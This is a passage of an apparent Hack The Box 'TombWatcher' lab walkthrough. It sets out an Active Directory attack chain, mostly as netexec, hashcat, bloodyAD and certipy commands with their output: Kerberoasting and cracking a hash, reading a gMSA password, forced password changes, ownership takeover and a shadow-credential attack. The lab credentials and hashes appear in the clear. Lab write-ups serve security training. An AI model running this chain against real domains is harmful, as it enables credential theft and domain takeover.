$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$caccada1a89a225209b06bf8c87d8162$383cccf7351dcb74cf0a4def198f0f9e2f925192a489c8810d20f42a4cc914699283632add435efb7b2740e104f6c2081fddd360250cf4205a32b14c23882fabdf4b773ab0efcc39ceb79950274b5a682a9219afeaee8e1cfe86076a94e23a74f13df3c7b62365291e5b68791ddb7adc7f07a59235518551884799cdd49b364008388f75bf99fef44592ed121f47ed1a88e88613339ad1b017199fd51754df2d56b4a5296d349b1b1fa11ecd83648d54c44b5a68aba9905546fc333db74cd2366bd4ee0bfd0d41935e7192e5313cb037689fa2b383133a0e3ca2a8a4f5e77f52218158d1f45e855ec9d887eef122e99c1d56b053f9c4a6af515baf391760df10e8af89f604f7399c46ca19150f99229b7ccbb9490133729c741ca25afe0441460b98ee3f5af8aaf4fa7241d3dc3c0aee7e04c81c24c486b8f8d0d5d4be17a4bdd8515941be8dcd3eea5e9542c376ab5873b7d8dd02dd4f4b72b97035dcc1f7713e59f7b6d1201d9f26d5f2b8d5c044412214806d0b73321f8fb816b09320a8ec4eba2e407183edcde069771c144994dae40f35647164521ce2c4b5e7ff374526e490846b75b2a959130439968ea0ee5686bb37639ad25f11b2ad7c7bc2d6283f98bcdee9402afcc99ac39ad2aae0abb9a4f086c8dd7cf8288798fe5ed2bd65a31788531d5f476ea9ffc04ba11f3181a759df20fbc217c5039c0e13cbe65b16288e818b41d5ee730defebb02ba2101195c4a298af52616b568d55d596ad6c3884f4c5dbc84e694058cef91b221e866969add7fe245f99938c2d831de3392d53067178a750ba583a07a69df5c569e3a14a4454b247b8d3f4c0be10bcefa0c5d9cc16a868444f3cb12440f380df19bea91c6997b9f09e2b4147dabd33a659f1a3c8d8ebe979721dd55798aef6f65e7ed6cd2204b602ec7dc13e54bba06ecfd1147af1a1ae70d8eadf3a7c02ac174353ed487189e332da4caa31862fba60d63fced5282cd14e0dc2fb9e720a4906313b1ae90798f91837870fa8120d2968aa47898cc77f919bdee3c9a78bd1a5dbce7d3ae22cbd19754d8fed0c24181d43410ef4c0c5626c87803097d0142cb1575b33be15747b8e15031dcdb19355868a4f5560a79fe533a9e07ef4e937e2d9821cb0c59b97a674e3e43275acc3e75d43ff354215e0bcc7e32f025996bc4d072b5b920e6bd520487b24382fed17cd0c74b9b86529e58a460dbf7d7a0a16f271ed1a0749a60792c253f53bb8938cb91a8f194a0212a71bdd1ca1ee7e65056d83263749bde13258071ece9b81c7abb1169d58133027213baf76191eba62456b1daa8c3f944f9ec91a6dd3f54e1dbba52ba291a023c385869fafcb54d982cc085cdf5f2f10494c2312abd38f0ff866bd82c0f3bf1ebf5e045d052369014d452af13c5af6fdd66496889ddd42fcb0d96cfc7d19f44dd00d18293719657d643186f9da73f8e959a16b023593

```

```
┌─[tester@parrot]─[~/Desktop/HTB/TombWatcher]
└──╼ $netexec ldap  tombwatcher.htb  -u 'henry' -p 'H3nry_987TGV!'  --kerberoasting kerberoasting.hashe -k
LDAP        tombwatcher.htb 389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) (signing:None) (channel binding:Never) 
LDAP        tombwatcher.htb 389    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 
LDAP        tombwatcher.htb 389    DC01             [*] Skipping disabled account: krbtgt
LDAP        tombwatcher.htb 389    DC01             [*] Total of records returned 1
LDAP        tombwatcher.htb 389    DC01             [*] sAMAccountName: Alfred, memberOf: [], pwdLastSet: 2025-05-12 23:17:03.526670, lastLogon: <never>
LDAP        tombwatcher.htb 389    DC01             $krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb\Alfred*$a23d01cee35d1e0aa66d37f18a2b2e14$43aa2aaf94f0a026ce62b2baffcf49f918c99f61822a52ffa3b0341e8980a431ebf7e9e1b80cc36ecb2ed8139b35c0b2da539bb88915c4afbb63cf17c2a47a6db91821c19780c63ee757a40c866391f5215ade2461f450011daac9bc3efd7ae6e8773dd6eda36ac11fc231da6f8af6692bf8895010cc32427a80b6be29c21ed320cdf0fd74fc579a5be668d011dcc0a11b73cb145b9a987ee2cb6214089798a97389e00a581ffeb1da914786de954e4361b15fcc3445ab2119ea8983d9054883b163a89ba9520d25863d7d447f4e857ebbd96dd14a3171f04a486ccee8563acf76121a7fc730d7b390cf30a05c4266037ed9c304fe6d11eb1005675ed58cbf04b9d55cf1a274fc65f11f46821e869f0790ca27768d437e7416ccd86bf117cf9e45dcf9e4a776680ecf836fa85e43417f6d091422de52669dc33b38c6a1a4da152495c3606868f360ea38e79098c44f51bce80d1c7d3eabaa8e97448f5ad9132c64b1a863aecd7baba4104ab3c78d6cb3151c986536cc2535c18819fe33acf105b3948de27a72bee3ce3043a9af094996e8543f21a553adb93816d49cc2c63fdf51ffa6725d5c7f3b06d58eb6b9daf9da4167b7f5c27d460254090949d30a6d39eff7038c5e8b9b6e470bbe85c49c418689b8b2427c6908a285f2b1aa602ddc71d2f86632619cab8806d7ef65c784b0601db04add663f8e6c1743ce0e2c15cc2837e20aafb1c4e37d4e9840353dab7c0a838c464c8624c9f9a4357cc7a78afa326e3ff8b5367a9a2eb25092e43ff4da7559849bf743b924046f586c9d73be541c135f65de487c6b21f6ab014262364db15d205b1ce8abb6fa3275f5a39cc5767d6d66e6dca7ddb9de80865405cfdb67f892f781a4bada825457b88958da9484f05e8a849ab7fe292aea5f0a3e30d2be2bc61ea7ae853c656433460df9fc39fcaf9cabedaccf0ca5bbc2d33d22e7ef6111e915156331eff1b179e9659f16d0218430796b632adcbcbe93db5f0956b3e5b0216d84d947c2dfa972fe1cbb44bcf49de72a18221cb1fe21b4e63e2d65a5967ff659514b581b73d729d876cb44db3d9753cd55891db86ced0a08e21f185938db564e0352cc885d47f5d56c260760fbb84ec0fa9e1c07758cfd807ca7df53d598f6ad0d94fe4bd868239c2c384228bd04bf7f0b9a07ebb11766412d8a87f20db83b8b032170052687414b1dac16cdd04318d377a4f057b934921b0af6f132eed250a9aaf759b965470c5ec89a35fadc70ff71a77bcefecac6d31253c3fab4b4adfc1e4cd51a6375445278d8369049eb209930e4abedb50afb6191c32455a86aa9543ffc8517d76c45681378c6a2c2ecfe74cb85f792c50d13d1caa0bd9c555ce32c495bb55511bd61f71c7ef2583bc2fffa4a639e7bc5fb9d547664ff3a3ff767452ce4b63feb80e5b3832fc0710617a063f48a4d85398ca7d3d95b7f684ee22ba53087969a

```

```
┌─[tester@parrot]─[~/Desktop/HTB/TombWatcher]
└──╼ $hashcat kerberoasting.hashe /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) Ultra 7 255U, 2897/5858 MB (1024 MB allocatable), 12MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 3 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb\Alfred*$a23d01cee35d1e0aa66d37f18a2b2e14$43aa2aaf94f0a026ce62b2baffcf49f918c99f61822a52ffa3b0341e8980a431ebf7e9e1b80cc36ecb2ed8139b35c0b2da539bb88915c4afbb63cf17c2a47a6db91821c19780c63ee757a40c866391f5215ade2461f450011daac9bc3efd7ae6e8773dd6eda36ac11fc231da6f8af6692bf8895010cc32427a80b6be29c21ed320cdf0fd74fc579a5be668d011dcc0a11b73cb145b9a987ee2cb6214089798a97389e00a581ffeb1da914786de954e4361b15fcc3445ab2119ea8983d9054883b163a89ba9520d25863d7d447f4e857ebbd96dd14a3171f04a486ccee8563acf76121a7fc730d7b390cf30a05c4266037ed9c304fe6d11eb1005675ed58cbf04b9d55cf1a274fc65f11f46821e869f0790ca27768d437e7416ccd86bf117cf9e45dcf9e4a776680ecf836fa85e43417f6d091422de52669dc33b38c6a1a4da152495c3606868f360ea38e79098c44f51bce80d1c7d3eabaa8e97448f5ad9132c64b1a863aecd7baba4104ab3c78d6cb3151c986536cc2535c18819fe33acf105b3948de27a72bee3ce3043a9af094996e8543f21a553adb93816d49cc2c63fdf51ffa6725d5c7f3b06d58eb6b9daf9da4167b7f5c27d460254090949d30a6d39eff7038c5e8b9b6e470bbe85c49c418689b8b2427c6908a285f2b1aa602ddc71d2f86632619cab8806d7ef65c784b0601db04add663f8e6c1743ce0e2c15cc2837e20aafb1c4e37d4e9840353dab7c0a838c464c8624c9f9a4357cc7a78afa326e3ff8b5367a9a2eb25092e43ff4da7559849bf743b924046f586c9d73be541c135f65de487c6b21f6ab014262364db15d205b1ce8abb6fa3275f5a39cc5767d6d66e6dca7ddb9de80865405cfdb67f892f781a4bada825457b88958da9484f05e8a849ab7fe292aea5f0a3e30d2be2bc61ea7ae853c656433460df9fc39fcaf9cabedaccf0ca5bbc2d33d22e7ef6111e915156331eff1b179e9659f16d0218430796b632adcbcbe93db5f0956b3e5b0216d84d947c2dfa972fe1cbb44bcf49de72a18221cb1fe21b4e63e2d65a5967ff659514b581b73d729d876cb44db3d9753cd55891db86ced0a08e21f185938db564e0352cc885d47f5d56c260760fbb84ec0fa9e1c07758cfd807ca7df53d598f6ad0d94fe4bd868239c2c384228bd04bf7f0b9a07ebb11766412d8a87f20db83b8b032170052687414b1dac16cdd04318d377a4f057b934921b0af6f132eed250a9aaf759b965470c5ec89a35fadc70ff71a77bcefecac6d31253c3fab4b4adfc1e4cd51a6375445278d8369049eb209930e4abedb50afb6191c32455a86aa9543ffc8517d76c45681378c6a2c2ecfe74cb85f792c50d13d1caa0bd9c555ce32c495bb55511bd61f71c7ef2583bc2fffa4a639e7bc5fb9d547664ff3a3ff767452ce4b63feb80e5b3832fc0710617a063f48a4d85398ca7d3d95b7f684ee22ba53087969a:basketball
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb...87969a
Time.Started.....: Fri Jun 12 21:52:17 2026 (0 secs)
Time.Estimated...: Fri Jun 12 21:52:17 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   101.4 kH/s (2.02ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 6144/14344385 (0.04%)
Rejected.........: 0/6144 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> iheartyou
Hardware.Mon.#1..: Util:  8%

Started: Fri Jun 12 21:51:42 2026
Stopped: Fri Jun 12 21:52:19 2026

```

Alfred : basketball

![Pasted image 20260612175450.png](/ob/Pasted%20image%2020260612175450.png)

```
(certipy-venv) ┌─[✗]─[tester@parrot]─[~/Desktop/HTB/TombWatcher]
└──╼ $certipy find -target DC01.tombwatcher.htb -u Alfred@tombwatcher.htb -p basketball -k -vulnerable -stdout
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] KRB5CCNAME environment variable not set
[!] DNS resolution failed: The DNS query name does not exist: DC01.tombwatcher.htb.
[!] Use -debug to print a stacktrace
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates                   : [!] Could not find any certificate templates

```

```
(certipy-venv) ┌─[tester@parrot]─[~/Desktop/HTB/TombWatcher]
└──╼ $certipy find -target DC01.tombwatcher.htb -u Alfred@tombwatcher.htb -p basketball -k -vulnerable -stdout
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] KRB5CCNAME environment variable not set
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates                   : [!] Could not find any certificate templates

```

### AddSelf & Infrastructure

{{< toggle "Tag 🏷️" >}}

{{< tag "Bloodhound-Vectory-AddSelf-Infrastructure" >}} Using the Netexec  and bloodyAD to abuse the AddSelf

{{< /toggle >}}

![Pasted image 20260612181122.png](/ob/Pasted%20image%2020260612181122.png)

```
(certipy-venv) ┌─[tester@parrot]─[~/Desktop/HTB/TombWatcher]
└──╼ $netexec ldap dc01.tombwatcher.htb -u alfred -p basketball --gmsa



LDAP        10.129.232.167  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.232.167  389    DC01             [+] tombwatcher.htb\alfred:basketball 
LDAP        10.129.232.167  389    DC01             [*] Getting GMSA Passwords
LDAP        10.129.232.167  389    DC01             Account: ansible_dev$         NTLM: <no read permissions>                PrincipalsAllowedToReadPassword: Infrastructure

```

```
(certipy-venv) ┌─[tester@parrot]─[~/Desktop/HTB/TombWatcher]
└──╼ $bloodyAD -d tombwatcher.htb -u alfred -p basketball --host dc01.tombwatcher.htb add groupMember Infrastructure alfred
[+] alfred added to Infrastructure

```

### ReadGMSAPassword

{{< toggle "Tag 🏷️" >}}

{{< tag "Bloodhound-Vectory-ReadGMSAPassword" >}} Using the Netexec 's gmsa and  bloodyAD to abuse the ReadGMSAPassword in Linux .

{{< /toggle >}}

```
(certipy-venv) ┌─[tester@parrot]─[~/Desktop/HTB/TombWatcher]
└──╼ $netexec ldap dc01.tombwatcher.htb -u alfred -p basketball --gmsa
LDAP        10.129.232.167  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.232.167  389    DC01             [+] tombwatcher.htb\alfred:basketball 
LDAP        10.129.232.167  389    DC01             [*] Getting GMSA Passwords
LDAP        10.129.232.167  389    DC01             Account: ansible_dev$         NTLM: b91f529d36292ba764273e5dd7b90fa1     PrincipalsAllowedToReadPassword: Infrastructure
```

![Pasted image 20260612181540.png](/ob/Pasted%20image%2020260612181540.png)

```
(certipy-venv) ┌─[tester@parrot]─[~/Desktop/HTB/TombWatcher]
└──╼ $ bloodyAD -d tombwatcher.htb -u alfred -p basketball --host dc01.tombwatcher.htb get object 'ANSIBLE_DEV$' --attr msDS-ManagedPassword

distinguishedName: CN=ansible_dev,CN=Managed Service Accounts,DC=tombwatcher,DC=htb
msDS-ManagedPassword.NT: b91f529d36292ba764273e5dd7b90fa1
msDS-ManagedPassword.B64ENCODED: dfOf6PKe7bpMD520AWA3CQmBHTHmJ0dvYuFsXA/LvWHSge3imcYyXs5qhwiyaPgo/8yRDOPPPP32AhLqlKUkbQWjZSvlU3QbvwaFv7kUIIStAQPY9D7VnTTwgQCXGcAt2igi7FmsPsj1ttbk8UFhOHyQFPU7Cg0QwUcVoXmOteb/lsBadtDV02sWWgjyHNjrfbX8GSd+ojciuZrbRvCTPo2GXrs1+GgqRLgfNJhVKljtn9xY47Wp8LZ1Q8PnLCVBBr7LG8ofKjH0eh7+/0jbUnb695jwNTNYVQlmspFf2fiHhcizO84Kr8Sns26zUHcLFfZVyy3sR6ByouCY9W+EBA==

```

`netexec` validates that the hash works:

### ForceChangePassword

{{< toggle "Tag 🏷️" >}}

{{< tag "Bloodhound-Vectory-ForceChangePassword" >}} Using the netexec in Linux to Abuse the blodhound path ForceChangePassword.

{{< /toggle >}}

```
(certipy-venv) ┌─[tester@parrot]─[~/Desktop/HTB/TombWatcher]
└──╼ $ netexec smb DC01.tombwatcher.htb -u 'ANSIBLE_DEV$' -H b91f529d36292ba764273e5dd7b90fa1 
SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\ANSIBLE_DEV$:b91f529d36292ba764273e5dd7b90fa1 

```

![Pasted image 20260612181605.png](/ob/Pasted%20image%2020260612181605.png)

```
(certipy-venv) ┌─[tester@parrot]─[~/Desktop/HTB/TombWatcher]
└──╼ $netexec smb DC01.tombwatcher.htb  -u 'ANSIBLE_DEV$' -H b91f529d36292ba764273e5dd7b90fa1   -M change-password -o USER=SAM  NEWPASS=Password123SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\ANSIBLE_DEV$:b91f529d36292ba764273e5dd7b90fa1 
CHANGE-P... 10.129.232.167  445    DC01             [+] Successfully changed password for SAM

```

### WriteOwner

{{< toggle "Tag 🏷️" >}}

{{< tag "Bloodhound-Vectory-WriteOwner" >}} With WriteOwner, I can set Sam as the owner of the John account. As owner, Sam can give themself `genericAll` over John. From there, Sam can either set John’s password, get a shadow credential, or targeted Kerberoast with bloodyAD in Linux .

{{< /toggle >}}

![Pasted image 20260612182115.png](/ob/Pasted%20image%2020260612182115.png)

```
(certipy-venv) ┌─[tester@parrot]─[~/Desktop/HTB/TombWatcher]
└──╼ $bloodyAD -d tombwatcher.htb -u sam -p 'Password123' --host dc01.tombwatcher.htb set owner john sam
[+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by sam on john

```

### Bloodhound-Vectory-GenericAll

{{< toggle "Tag 🏷️" >}}

{{< tag "Bloodhound-Vectory-GenericAll" >}} In Linux , using the bloodyAD to adbuse the GenericALL

{{< /toggle >}}

![Pasted image 20260612182704.png](/ob/Pasted%20image%2020260612182704.png)

```
(certipy-venv) ┌─[✗]─[tester@parrot]─[~/Desktop/HTB/TombWatcher]
└──╼ $ bloodyAD -d tombwatcher.htb -u sam -p 'Password123' --host dc01.tombwatcher.htb set owner john sam
[+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by sam on john

```

```
(certipy-venv) ┌─[✗]─[tester@parrot]─[~/Desktop/HTB/TombWatcher]
└──╼ $bloodyAD -d tombwatcher.htb -u sam -p 'Password123' --host dc01.tombwatcher.htb add genericAll john sam
[+] sam has now GenericAll on john

```

![Pasted image 20260612182751.png](/ob/Pasted%20image%2020260612182751.png)

Now `certipy` will do the shadow credential attack:

```
(certipy-venv) ┌─[tester@parrot]─[~/Desktop/HTB/TombWatcher]
└──╼ $certipy shadow auto -target dc01.tombwatcher.htb -u sam -p 'Password123' -account john
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Targeting user 'john'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'a5a376ce7a3e4ceb9da561ca22c284cf'
[*] Adding Key Credential with device ID 'a5a376ce7a3e4ceb9da561ca22c284cf' to the Key Credentials for 'john'
[*] Successfully added Key Credential with device ID 'a5a376ce7a3e4ceb9da561ca22c284cf' to the Key Credentials for 'john'
[*] Authenticating as 'john' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'john@tombwatcher.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'john.ccache'
[*] Wrote credential cache to 'john.ccache'
[*] Trying to retrieve NT hash for 'john'
[*] Restoring the old Key Credentials for 'john'
[*] Successfully restored the old Key Credentials for 'john'
[*] NT hash for 'john': ad9324754583e3e42b55aad4d3b8d2bf

```

```
(certipy-venv) ┌─[tester@parrot]─[~/Desktop/HTB/TombWatcher]
└──╼ $ netexec smb dc01.tombwatcher.htb -u john -H ad9324754583e3e42b55aad4d3b8d2bf
SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\john:ad9324754583e3e42b55aad4d3b8d2bf 

```

```
(certipy-venv) ┌─[tester@parrot]─[~/Desktop/HTB/TombWatcher]
└──╼ $certipy find -target dc01.tombwatcher.htb -u john -hashes :ad9324754583e3e42b55aad4d3b8d2bf
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Failed to lookup object with SID 'S-1-5-21-1392491010-1358638721-2126982587-1111'
[*] Saving text output to '20260612223239_Certipy.txt'
[*] Wrote text output to '20260612223239_Certipy.txt'
[*] Saving JSON output to '20260612223239_Certipy.json'
[*] Wrote JSON output to '20260612223239_Certipy.json'

```

```
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\Domain Users
    [*] Remarks
      ESC2 Target Template              : Template can be targeted as part of ESC2 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
      ESC3 Target Template              : Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.

```
